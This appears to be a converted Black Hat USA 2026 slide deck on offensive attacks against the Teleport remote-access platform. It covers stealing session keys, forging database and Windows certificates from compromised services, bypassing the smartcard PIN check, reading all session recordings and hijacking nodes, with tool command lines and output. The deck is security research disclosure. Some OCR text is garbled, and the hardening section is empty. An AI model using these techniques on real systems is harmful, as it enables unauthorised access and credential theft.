---
title: "Beam Me Up, Luke A Review of Teleport Attack Scenarios"
speakers: ["Adam Chester"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Adam Chester_Beam Me Up, Luke A Review of Teleport Attack Scenarios.pdf"
pages: 90
sha256: "3c995b4e09191cadbc261ccbc5d0f3ffc1d893909e081e9243ed23a96b7d120e"
text_chars: 31614
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.9
ocr_unreliable_blocks: 0
vision_verified_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:28:03Z"
---
# Beam Me Up, Luke A Review of Teleport Attack Scenarios

**Speakers:** Adam Chester  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Adam Chester_Beam Me Up, Luke A Review of Teleport Attack Scenarios.pdf` (90 pages)


## Slide 1

**Beam Me Up, Luke** A Review of Teleport Attack Scenarios

Information Classification: General

## Slide 2

# Agenda

### • Introduction

- A Brief Overview of Teleport

- Attack Scenarios

- Hardening Steps

X

## Slide 3

# whoami

## Adam Chester (XPN)

- TRACE at SpecterOps

- Red Teamer

- Researcher

• Blogger

@_xpn_

/in/xpn

###### <u>https://blog.xpnsec.com</u>

2

Information Classification: General

## Slide 4

# What is Teleport?

Can be difficult to tell from the website: “Unified Identity Securing Classic & AI Infrastructure”

“Teleport establishes a unified identity layer secured cryptographically - minimizing access paths by eliminating identity fragmentation and credential sprawl.”

X

Information Classification: General

## Slide 5

# What is Teleport?

Teleport is a remote access solution Similar to a VPN, it provides remote access to:

- SSH servers

- Windows servers

- Database servers

- MCP servers

- Internal web applications

- Kubernetes Pods

3

Information Classification: General

## Slide 6

# What is Teleport?

Provides auditing of sessions

- SSH Session Recordings

- Windows Desktop Recordings

- Database Session Recordings

Allows management of users & roles Open Source & Enterprise Versions Self Hosted & Cloud Hosted

Targets macOS / *nix - Over to you for Windows ;)

This research was completed on Teleport version v18.6.1

4

Information Classification: General

## Slide 7

# Navigating This Talk

A lot goes into Teleport, so we will focus on the key areas by walking through the various components:

- We’re going to put our Red Teamer hat on and walk through each component

- I’ll explain enough about how the component works

• Then I’ll show some methods that can be applied for offensive security use As you watch, keep looking for opportunities to apply these concepts elsewhere in Teleport, you’ll likely find other issues.

Hope you didn’t ignore this

X

Information Classification: General

## Slide 8

# Architecture

Cluster

Database Windows RDP Node

Auth Server

Proxy Server

User

5

Information Classification: General

## Slide 9

# Endpoint

Interaction with Teleport for a user is typically via one of two tools:

• tsh - CLI tool which allows authentication, access to services etc..

• web - Web UI used to access services such as RDP

Authentication to the Proxy Server is handled using a set of keys generated during initial authentication.

mTLS used with these keys to provide access to services via the Proxy Server

6

Information Classification: General

## Slide 10

# Endpoint

###### If you have access to an endpoint which has a user signed-in, we can take advantage of the existing session:

On *nix:

- ~/.tsh - Contains current set of keys

- ~/.tsh/keys/[cluster-name]/[username].crt

- ~/.tsh/keys/[cluster-name]/[username].key

- ~/.tsh/keys/[cluster-name]/[username].pub

On Windows:

C:\Users\[username]\.tsh

###### <u>Nothing tying the certificate or keys to the host by default, we can extract if needed.</u>

7

Information Classification: General

## Slide 11

Endpoint

###### Extract keys to local system

###### Works locally

X

Information Classification: General


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Endpoint
attacker@teleport-linclient:~$ tsh ls --proxy 10.1.10.1:8443 --insecure
Enter password for Teleport user attacker:
ERROR: failed reading prompt response
context canceled
attacker@teleport-Linclient:~$ scp -r Localuser@teleport-user:/home/localuser/.tsh ~/
Extract keys to Localuser@teLeport-user's password:
known_hosts
local system xpn-teLleport-server.yamL
current-profile
reguLar-user-no-agent.pub
exampLle.com-cert.pub
certs.pem
reguLar-user-no-agent
Works locally -config.json
attacker@teleport-linclient:~$ tsh ls
Node Name Address Labels
teLeport-node € Tunnel
teLeport-node-2 € Tunnel
xpn-teLleport-server 127.0.0.1:3022
attacker@teleport-lLinclient:~$ |
2026 x
```

## Slide 12

# Endpoint

For connecting to services such as Database Servers, Application Servers, MCP Servers etc, Teleport provides access using the tsh command

- tsh db connect

8

Information Classification: General

## Slide 13

# Endpoint

### This works by setting up a local proxy using tsh

client is then used to connect to the local proxy The proxy wraps mysql traffic in a TLS authenticated session

TLS Tunnel
 mysql connection
Local Proxy

9

Information Classification: General

## Slide 14

Endpoint

If the victim is using a Database service, we can hijack this.

tsh acts as a tunnel proxy for things like database access:

So we can just use the existing TCP socket to reach the same database server.

10

Information Classification: General

## Slide 15

# Endpoint

###### User is executing tsh command, so we hijack the connection:

X

Information Classification: General


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Endpoint
User is executing tsh command, so we hijack the connection:
Localuser@teleport-user:~$ mysql --defaults-group-suffix=_example.com-teleport-db --skip-password --user xpn --database secret_db --port 38943 --host localhost --protocol TCP
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 10015
Server version: 8.0.46-Qubuntu0.24.04.3 (Ubuntu)
Copyright (c) 2000, 2026, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
2026 x
```

## Slide 16

Endpoint

If we list the .tsh directory again, we’ll find a new set of keys:

Again these keys can be extracted and used from another host.

I’ll answer the “how did they get there” question later

11

Information Classification: General

## Slide 17

# Endpoint

### Same works for:

### Applications

### SSH

I’ll answer the “how did they get there” question later

X

Information Classification: General

## Slide 18

# Architecture

Database Windows RDP Node

Auth Server

Proxy Server

User

12

Information Classification: General

## Slide 19

# Proxy Server

Teleport Proxy Server provides the tunnel between external to internal connections Proxy Servers are stateless and several can be used for redundancy Uses Application Layer Protocol Negotiation (ALPN) to route connections:

13

Information Classification: General

## Slide 20

# Proxy Server

A few Teleport supported ALPN values:

- teleport-auth - Access to the Auth Server

- teleport-mysql - Access to a mysql Server

- teleport-reversetunnel - Used by internal servers to create reverse tunnels

- teleport-mcp - Access a MCP server

Elegant way to support multiple protocols across a single TCP port Teleport call this “multiplexing” and it is the default routing method

Makes research difficult, so we need tooling

Full list of ALPN

14

Information Classification: General

## Slide 21

# Proxy Server

One of the difficulties for researchers is creating authenticated tunnels through the proxy server when testing

tsh provides proxy commands (as we saw with database), but research needs arbitrary attributes like ALPN values

X

Information Classification: General

## Slide 22

# Teleport API

tunnel-manager is a simple tool which establishes a connection over TLS You provide a client certificate/key and a ALPN, and tunnel-manager creates the TLS connection, binding to a TCP port for other applications to use Think SOCAT

TLS Tunnel
 gRPC Traffic

15

Information Classification: General

## Slide 23

# Architecture

Database Windows RDP Node

Auth Server

Proxy Server

User

16

Information Classification: General

## Slide 24

# Auth Server

Consists of a certificate authority and provides control plane for the Teleport cluster Stores user-accounts, roles, CA certificates in a database: • Uses a local SQLite database by default

• Postgres, DynamoDB, GCP Firestore all supported as options If you compromise the database, you own the Teleport Cluster

X

Information Classification: General

## Slide 25

# Auth Server

Also stores Audit Logs and Session Recordings:

- Recordings stored to a local filesystem by default

- Also supports S3 or Google Cloud Storage

- Storage logs can be encrypted (not default in self-hosted open source version)

Format is:

- 24 bytes of header

- Remaining is gzip compressed

Decode with:

X

Information Classification: General

## Slide 26

# Auth Server

Acts as a Certificate Authority & Control Plane Signs certificates with one of several CA certificates, for example:

- Host CA

- User CA

- Database CA

- Windows Desktop CA

Auth Server service exposed on port 3050 internally, but interaction is normally via the Proxy Server

17

Information Classification: General

## Slide 27

# Auth Server

### Teleport supports Role Based Access Controls

Options cover service specific toggles

X

Information Classification: General

## Slide 28

# Auth Server

Allow section sets permitted Users, databases, desktop names

Labels permit access to matching resources

Rules permit access to resource actions (CRUD)

X

Information Classification: General

## Slide 29

# Auth Server

The Auth Server exposes the Teleport API

Two API transports are:

- HTTP via a REST API

- gRPC over a TLS endpoint

List of .proto files can be found in the Teleport git repo

18

Information Classification: General

## Slide 30

# Auth Server

### We can navigate with grpcui to interact with most of the exposed gRPC methods:

Most gRPC services require TLS authentication and an ALPN value which grpcui doesn’t support

Tunnel-Manager can be used for this:

X

Information Classification: General

## Slide 31

# Auth Server

To access the Auth Server, we need to use two ALPN values

ALPN in in the format of: teleport-auth@5448495369736e7441637466.teleport.cluster.local,h2

• 5448495369736e7441637466 - Hex encoded Cluster Name

• h2 - Secondary ALPN value

19

Information Classification: General

## Slide 32

# Auth Server

### When tunnel-manager is used, we can use grpcui to explore the API:

20

Information Classification: General


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Auth Server
When tunnel-manager is used, we can use grpcui to explore the API
./tunnel-manager alpn \
-b 127.0.0.1:9090 \
-c /tmp/client.crt \
-k /tmp/client.key \
-p 'teleport-auth@,h2' \
-x teleport-server:8443
[+] Starting TCP server to connection proxy: [127.0.0.1:9090]
[*] Local server listening on 127.0.0.1:9090
grpcui
grpcui \
-import-path ./gogo \
-import-path ./teleport/api/proto \
-proto ./teleport/api/proto/teleport/legacy/client/proto/authservice.proto \
-insecure \
Localhost:9090
“§RPC Web UI
Connected to localhost:8021
Service name: | proto.AuthService v
Method name: | UpsertNode
Request Form Raw Request Response
Request Metadata
Name
ls) Add item
Request Data
History
black h
2026
at
20
```

## Slide 33

# Auth Server

Now we can answer the question of “how did the new database keys get there”? 1. A TLS connection is established to the Auth Server using the users TLS key 2. The AuthService gRPC service GenerateUserCerts method is invoked with a public key to be signed

3. A signed certificate is returned which grants access to the service

21

Information Classification: General

## Slide 34

# Auth Server

Certificates returned are signed by the relevant CA in Teleport • Subject - Usage restrictions:

- CN - The username of the authenticating user

- O - The Teleport groups the user is a member of

- OU - Any restrictions on the user session

- L - Principals used for authentication to SSH services

- S - The cluster name

- postalCode - Traits

Maximum time: ~10 hours

Additional Extensions

22

Information Classification: General

## Slide 35

# Auth Server

### Our Database Cert:

O access, database-access OU usage:db CN username

1.3.9999.2.1 Database service name = teleport-db 1.3.9999.2.2 Database protocol = mysql 1.3.999.2.3 Database username = xpn 1.3.999.2.4 Database name = secret_db

X

Information Classification: General

## Slide 36

# Auth Server

This is why the Proxy Server can be stateless, any information needed to approve or deny a connection is contained in the certificate

Also means that if we access a certificate, we can validate what access a user may have based on the certificate contents alone Nothing to stop us from taking a compromised certificate, and periodically extending this using GenerateUserCerts API!

23

Information Classification: General

## Slide 37

# Architecture

Database Windows RDP Node

Auth Server

Proxy Server

User

24

Information Classification: General

## Slide 38

# Services

When Teleport Agent is installed, services are configured to expose local or remote servers.

Several types of services exist:

- Node Service (SSH)

- Database Service

- Windows Desktop Service

- Application Service

- MCP Service

Services act as reverse-proxies for local and remote servers.

25

Information Classification: General

## Slide 39

# Services

Keys for services are stored in /var/lib/teleport/proc/sqlite.db These keys are the authentication keys for the services offered by the server These keys can be extracted similar to user keys and used from a different host

26

Information Classification: General

## Slide 40

# Database Service

Database Windows RDP Node

Auth Server

Proxy Server

User

27

Information Classification: General

## Slide 41

# Database Service

Database Service acts as a reverse proxy to a database Database uses certificates for authentication (signed by the Teleport CA) Reminder that tsh CLI command provides access to a target database

28

Information Classification: General

## Slide 42

# Database Service

Auth Server

Proxy Server

Database Service

MySQL Server

User

29

Information Classification: General

## Slide 43

# Database Service

Configuring the back-end database means adding the Teleport Database Client CA cert to the database server The Teleport Database Service can then generate authentication certificates for connecting users on the fly

30

Information Classification: General

## Slide 44

# Database Service

Auth Server

Proxy Server

Database Service

MySQL Server

User

X

Information Classification: General

## Slide 45

# Database Service

If we compromise a Database Service server, we have the option to authenticate as ANY USER to the database server.

This can be thought of as a silver-ticket style attack

We need to extract the service key from /var/lib/teleport/proc/sqlite.db

certificate-tool built to automate this generation GenerateDatabaseCert API method used to sign

31

Information Classification: General

## Slide 46

# Database Service

But… we can also authenticate as ANY USER to ANY OTHER DATABASE within a Cluster:

32

Information Classification: General

## Slide 47

# Database Service

But… we can also connect to ANY USER to ANY OTHER DATABASE within a Cluster:

Recording: https://youtu.be/Su5p-T_09Kc

33

Information Classification: General

## Slide 48

# Database Golden Certificate

### Why does this work?

Teleport requires that databases trust the same database CA certificate across the cluster. Database services register their back-end databases dynamically to the Auth Server, there is no way for Teleport to know up front which databases or users should be permitted.

34

Information Classification: General

## Slide 49

# Windows Service

Database Windows RDP Node

Auth Server

Proxy Server

User

35

Information Classification: General

## Slide 50

# Windows Service

Auth Server

Proxy Server

Windows Service

Windows Server

User

**36**

Information Classification: General

## Slide 51

# Windows Service

Windows Service exposes RDP via a reverse-tunnel Web interface used to interact with the back-end Windows Server Select user to authenticate as, and Teleport handles the rest

I was at Starbucks :(

37

Information Classification: General

## Slide 52

# Windows Authentication

Windows access is currently via the Teleport web UI: Behind the scenes, this is a port of IronRDP with Virtual SmartCard support bolted on

38

Information Classification: General

## Slide 53

# Windows Authentication

Authentication uses certificates signed by Teleport’s Windows Desktop CA Access to a Windows Service means the same attack is possible as the Database server, we can request certificates for any user for any RDP server in the Cluster Use the service TLS key and Certificate to request via GenerateWindowsDesktopCert

39

Information Classification: General

## Slide 54

# Windows Golden Certificate

### certificate-tool allows us to automate this:

40

Information Classification: General


> Recovered by OCR — confidence 90/100 on the text kept, 52/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows Golden Certificate
certificate-tool allows us to automate this:
certificate-tool
go run ./main.go windows \
--cert /tmp/win.crt \
--key /tmp/win.key \
--user localuser \
--target TELEPORT-WINCLIENT-2 \
--output /tmp/lelu/
\/ \V/ \/ \V/ \/
[*] Certificates generated:
USA 40
2026
```

## Slide 55

# Windows Golden Certificate

But unlike other Teleport services, we need a new client to use the certificate.

I created a fork of IronRDP which we can use without a browser This fork adds in Teleport’s SmartCard PIV support

Allows us to take any generated certificate from a compromised Windows Service, and authenticate to a Windows server directly over RDP using a Virtual SmartCard.

41

Information Classification: General

## Slide 56

# Windows Golden Certificate Demo

42

Information Classification: General


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows Golden Certificate Demo
RDPDR POU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceloResponse { device
-id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(LongReturn { re
turn_code: Success })) })
Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: Dev
‘iceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: So
me(Pdu(ReadCacheReturn { return_code: CacheItemNotFound, data: [] })) }))
RDPDR PDU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device
id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(ReadCacheReturn
{ return_code: CacheItemNotFound, data: [] })) })
Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: Dev
iceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: So
me(Pdu(LongReturn { return_code: Success })) }))
RDPOR POU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceloResponse { device
id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(LongReturn { re
turn_code: Success })) })
Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: Dev
iceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: So
me(Pdu(ReadCacheReturn { return_code: CacheItemNotFound, data: [] })) }))
RDPDR POU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device
id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(ReadCacheReturn
{ return_code: CacheItemNotFound, data: [] })) })
‘Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: Dev
iceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: So
me(Pdu(LongReturn { return_code: Success })) }))
RDPDR PDU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device
~id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(LongReturn { re
turn_code: Success })) })
Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: Dev
iceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: So
me(Pdu(ReadCacheReturn { return_code: CacheItemNotFound, data: [] })) }))
RDPDR POU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device
id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(ReadCacheReturn
{ return_code: CacheItemNotFound, data: [] })) })
Received ClientFunction call: WriteRdpdr(RdpdrPdu(DeviceControlResponse { device_io_reply: Dev
iceIoResponse { device_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: So
me(Pdu(GetStatusChangeReturn { return_code: Success, reader_states: [ReaderStateCommonCall { c
urrent_state: CardStateFlags(0x0), event_state: CardStateFlags(SCARD_STATE_CHANGED | SCARQ_STA
TE_PRESENT), atr_length: 11, atr: [59, 149, 19, 129, 1, 128, 115, 255, 1, 0, 11, @, 0, 0, ¥, ®
RDPDR PDU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceIoResponse { device
_id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(GetStatusChange
Return { return_code: Success, reader_states: [ReaderStateCommonCall { current_state: CardStat
eFlags(8x0), event_state: CardStateFlags(SCARD_STATE_CHANGED | SCARD_STATE_PRESENT), atr_lengt
h: 11, atr: (59, 149, 19, 129, 1, 128, 115, 255, 1, 6, 11, 0, 0, 8, 0, 0, 6, GB, O, 6, B, A, 0,
@ys4 42
```

## Slide 57

Recording: https://youtu.be/h2Ky-BMCLLk

43

Information Classification: General

## Slide 58

# Windows

### That’s not all…

44

Information Classification: General

## Slide 59

# SmartCard PIV 101

A SmartCard in RDP works by exposing a virtual channel from the client host to the server. Allows connection of a SmartCard to a client to be shared with the server for hopping to further servers. PIV (Personal Identity Verification) is the interface used to expose cryptographic operations to the OS Commands are sent using APDU (Application Protocol Data Unit)

###### APDU has the following structure:

CLA INS P1 P2 Len Data Response Len

Operations we care about for this section are:

1. VERIFY PIN - Verifies that a user-provided PIN is valid for the card before allowing authentication 2. GENERAL AUTHENTICATE - Challenge / Response Authentication

X

Information Classification: General

## Slide 60

# Windows SmartCard

Teleport Virtual SmartCard is initialized with a random PIN It is made available to RDP over a virtual channel by default But without knowing the PIN, it can’t be used

Comparison between PIN and stored random PIN

45

Information Classification: General

## Slide 61

# Windows SmartCard

##### APDU instructions are dispatched to their appropriate handler by the Virtual SmartCard

But… there is no state being managed. This means that a PIN is not required to be valid before we can authenticate

46

Information Classification: General

## Slide 62

# Windows Authentication

MSTSC.exe (RDP) uses the WinSCard.dll API’s to communicate with the SmartCard SCardTransmit API to send commands to the SmartCard

As the PIN check is stateless, we can intercept SCardTransmit and simply reply with a SUCCESS. As the SmartCard never verifies if the PIN was valid (or even provided), MSTSC.exe then just moves onto the GENERAL AUTHENTICATE command.

A lot goes into Windows to avoid hijacking SmartCards across Logon Sessions, so not as simple as just spawning MSTSC.exe as a victim user, as the current Logon Session ID (and not the Token) is used to select the SmartCard.

The attack then becomes a relay attack!

47

Information Classification: General

## Slide 63

# Windows Authentication

#### The plan becomes:

1. As an elevated user, we wait for a victim to authenticate to a shared host using Teleport 2. We immediately execute a SmartCard “skimmer” application as the victim user which waits for connections over a named pipe.

3. We start MSTSC.exe as our attacking user, hooking SCardTransmit API 4. We intercept any requests for a PIN, and simply reply with a SUCCESS 5. We forward any GENERAL AUTHENTICATE commands over the named pipe to be serviced by the victim’s Teleport SmartCard

If all works well, we can hijack the SmartCard of the user, evade PIN requirements, and hop onto another RDP server as the victim.

X

Information Classification: General

## Slide 64

# Windows Authentication

48

Information Classification: General


> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows Authentication
@ New Order-the compute | @ Xbox-Scene.com - Xbox Bowlers Exhibition Centre @_ New Tab Welcome to VX Heavens! = @ New Tab @ 290A Lads 1@ Resources +
=
Administrator on teleport-winclient G8 Ae
:\temp>whoami
winclient1\administrator
:\temp>SmartcardSkimmer .exe
83 109 97 114 116 99 97 114 100
83 107 105 109 109 101 114
[*] Baseline PID: 1584
[*] New user session found: 4112
[*] New DLL Loaded, threadId: 772
oa 48
Information Classification: 2026
General
```

## Slide 65

Recording: https://youtu.be/SUIM9Y_owMY

49

Information Classification: General

## Slide 66

# Node Service

Database Windows RDP Node

Auth Server

Proxy Server

User

50

Information Classification: General

## Slide 67

# Node Service

Teleport provided SSH Server Uses Certificates for Authentication (signed by the Teleport SSH CA)

Security preferences baked into certificate:

51

Information Classification: General

## Slide 68

# Node Service

Auth Server

Proxy Server

Node Service

User

52

Information Classification: General

## Slide 69

# Node Service

###### SSH access works via SSH certificate

Determines which user accounts we can access:

Node itself is a service which authenticates to the auth server using its own key. Found in /var/lib/teleport/proc/sqlite.db:

KV table contains keys:

X

Information Classification: General

## Slide 70

Node Service

Users that can
auth
Policy  User Roles
none
{"roles":["access"]}
Permitted
Forwarding Cluster Name
example.com
Traits
{"logins":["localuser"]}

X

Information Classification: General

## Slide 71

# Node

### Extracting the key allows authentication to the Auth Server to allow for things like:

- Generating new SSH keys

- Generating new TLS certificates

- Uploading recorded sessions

X

Information Classification: General

## Slide 72

Node

The problem is, permissions for the internal Node role are scoped too wide. Access to a single Node cert gives access to <u>ALL RECORDS ACROSS A CLUSTER</u>

This rule allows access to SSH Session Recordings

While this one allows enumerating Required Session ID

53

Information Classification: General

## Slide 73

Node

### Log-Viewer tool created to list all available session recordings.

Provide a Node key and point at a proxy to get a list

54

Information Classification: General

## Slide 74

Node

55

Information Classification: General


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
b
Information Classification: 2026
General
ack hat
2026 55
```

## Slide 75

Recording: https://youtu.be/Ca3D8HLS2qg

56

Information Classification: General


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 90/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Terminal screenshot]

     …/TAK    wip ?    v1.26.4    15:39
❯ go run log-viewer/main.go list --cert /tmp/node.crt --key /tmp/node.key --proxy xpn-teleport-server:8443

[ASCII-art banner reading: LOG-VIEWER]
              @_xpn_

[b9c5c4ca-3ae0-43a0-8d4a-9eac4482f188]: localuser@teleport-node - 2026-06-29 12:30:57.867 +0000 UTC - 1 seconds
[c10decb0-0ffa-47a9-8a38-3903a03516f3]: localuser@teleport-node - 2026-06-29 15:57:43.087 +0000 UTC - 2735 seconds
[4fe5f304-e67b-42cb-a2dd-9a7d2e987812]: localuser@teleport-node - 2026-06-30 14:03:20.967 +0000 UTC - 16 seconds
[2f8596b0-d287-4b66-b189-2a565c630a3c]: localuser@teleport-node - 2026-06-30 14:06:43.194 +0000 UTC - 74 seconds
[c686e643-a18b-49f9-8176-86bb02a36297]: localuser@teleport-node - 2026-06-30 14:07:10.364 +0000 UTC - 17 seconds
[92019612-2141-4eb6-88fc-d180562214d2]: localuser@teleport-node - 2026-07-01 18:35:54.924 +0000 UTC - 74665 seconds
[d42138d2-54bf-4fed-9f7b-8e5d46a65941]: localuser@teleport-node - 2026-07-02 14:28:52.313 +0000 UTC - 29 seconds
[dc55bc61-3ef0-4e54-8fe4-4afb97cdf027]: localuser@teleport-node - 2026-07-02 14:30:17.442 +0000 UTC - 14 seconds

     …/TAK    wip ?    v1.26.4    15:39
❯

Recording: https://youtu.be/Ca3D8HLS2qg
```

## Slide 76

# Tunneling to SSH

### Now we can talk about one of the main features of Teleport, SSH Tunneling

1. ALPN teleport-proxy-ssh-grpc

2. gRPC connection made to TransportService 3. ProxySSH method used to establish streaming proxy

57

Information Classification: General

## Slide 77

# Tunneling to SSH

That gets us to here

Auth Server
Proxy Server Node Service
What about here?
User

58

Information Classification: General

## Slide 78

# Tunneling to SSH

### Services use SSH to establish a reverse-tunnel to the proxy

1.TLS connection made to Auth Server from Node with ALPN teleport-reverse 2.SSH connection over this TLS connection is setup with Node’s SSH key and certificate

Once SSH connection is up, outbound channels created:

- teleport-heartbeat channel for keep-alive

Inbound channels also established:

- teleport-discovery for information on available proxies

- teleport-transport for handling new incoming connections

59

Information Classification: General

## Slide 79

# Reverse Tunneling

When a teleport-transport channel is established, an out of band request is sent from the Teleport auth server when a new connection is being made inbound:

{ "address":"@local-node", "server_id":"0d145b12-f974-4641-8033-791554f4de66.tps.cerberusostrich.ts.net", "conn_type":"node", "client_src_addr":"192.0.2.254:62027", "client_dst_addr":"127.0.0.1:443" }

This tells the SSH node:

1. The inbound client connecting

2. The connection type being requested (node)

Once received, data sent over the established teleport-transport channel will be tunneled between the local node service and the remote client.

X

Information Classification: General

## Slide 80

# Tunneling to SSH

### Reverse-Tunnel tool created to help recreate this reverse tunnel

Takes Node keys

Host to forward to

60

Information Classification: General

## Slide 81

# Node Hijacking

Compromised Node credentials also have permission to update other Node objects on the Auth Server

This allows us to perform a hijacking attack, where we:

1. Invoke the UpsertNode API to rename an existing victim Node

2. Invoke the GenerateHostCerts API to craft and sign new certs with same Hostname 3. Run reverse-tunnel tool to receive connections to our victim

61

Information Classification: General

## Slide 82

# Node Hijacking

### Node-Hijack allows us to carry out this attack

62

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Node Hijacking —
Node-Hijack allows us to carry out this attack
tsh
Localuser@teleport-user:~$ tsh ssh --user regular-user --proxy teleport-server:8443 teleport-
node
Enter password for Teleport user regular-user:
Enter an OTP code from a device:
node-hijack
go run ./main.go hijack \
-c /tmp/node.crt \
-k /tmp/node.key \
-n 58102c12-cf6a-4fd9-b74f-8a6c0e93765F
[*] Press Enter to clean up...
] SSH Server Started on port 2223
*] Renaming hostname: teleport-node-2 to teleport-node-2-archived
[*] Adding Node to hijack: teleport-node-2
[x] Hijacked Node: teleport-node-2 black hat
USA
2026 62
```

## Slide 83

# Node Hijacking Demo

63

Information Classification: General

## Slide 84

Node Hijacking Demo

Recording: https://youtu.be/32QrQvVMPl8

64

Information Classification: General


> Recovered by OCR — confidence 89/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
} go run ./main.go ssh -c /tmp/node.crt -k /tmp/node.key -n teleport-node-2 -o /tmp/hijack-certs/| |
Recording: https://youtu.be/32QrQvVMPI8
```

## Slide 85

# Node Hijacking Agent

### But there is more.

If we are forwarding our SSH agent, there is an issue, the option to forward SSH agents (on / off) is controlled on the node SSH side, not on the client side This means that our fake SSH server won’t deny this, we just accept any agent Teleport adds in the certificate of the user SSH access, so we can just hijack this.

65

Information Classification: General

## Slide 86

# Node Forwarding Demo

66

Information Classification: General

## Slide 87

# Node Forwarding Demo

Recording: https://youtu.be/RaDHaAkTdx8

67

Information Classification: General


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Slide title is cropped off the top edge of the page - only the tops of the letters are visible: illegible]

[Left terminal window - title bar: localuser@teleport-node-2: ~]

        /tmp/hijack-certs/host_tls.pub

     …/TAK/certificate-tool    wip x!?    v1.26.4    18:04
❯ cd ../node-hijack

     …/TAK/node-hijack    wip x!?    v1.26.4    18:04
❯ go run ./main.go mitm -c /tmp/hijack-certs/host_tls_signed.crt -k /tmp/hijack-certs/host
.key -n d1c11d95-883c-4062-a71a-7f0c709cc402

[ASCII-art banner reading: NODE-HIJACK]
        @_xpn_

[*] SSH Server Started on port 2223

[*] Agent connected, listing keys
[*] Key: ssh-ed25519-cert-v01@openssh.com
[*] Key: ssh-ed25519
details:{}
localuser@teleport-node-2:~$ ls
localuser@teleport-node-2:~$ ls /tmp

[dimmed / faded-out earlier terminal content below the divider line:]
    -o 127.0.0.1:2223 \
    -x teleport-server:8443 \
    -u teleport-node-2.example.com

[ASCII-art banner reading: REVERSE-TUNNEL]
        @_xpn_

[*] teleport-transport-dial request sent
[*] New channel requested: teleport-discovery
[*] Received request on teleport-discovery channel: discovery
[*] Payload: {"proxies":[{"version":"v2","metadata":{"name":"[illegible - hidden behind the "Recording:" overlay]4ee572b"}}]}
[*] Received request on teleport-discovery channel: discovery
[*] Payload: {"proxies":[{"version":"v2","metadata":{"name":"23a49958-4448-4770-b62f-5f1ed4ee572b"}}]}
[*] New channel requested: teleport-transport
[!] Received request on teleport-transport channel: teleport-transport-dial
[*] Payload: {"address":"@local-node","server_id":"teleport-node-2.example.com","conn_type":"node","client_src_addr":"10.1.10.22:36470","client_dst_addr":"127.0.0.1:8443"}

[Right terminal window - title bar: localuser@teleport-node-2: ~]

localuser@teleport-user:~$ tsh ssh -A teleport-node-2
localuser@teleport-node-2:~$ ls
localuser@teleport-node-2:~$ ls /tmp

Recording: https://youtu.be/RaDHaAkTdx8

Information Classification:
General

black hat USA 2026
67
```

## Slide 88

# Hardening

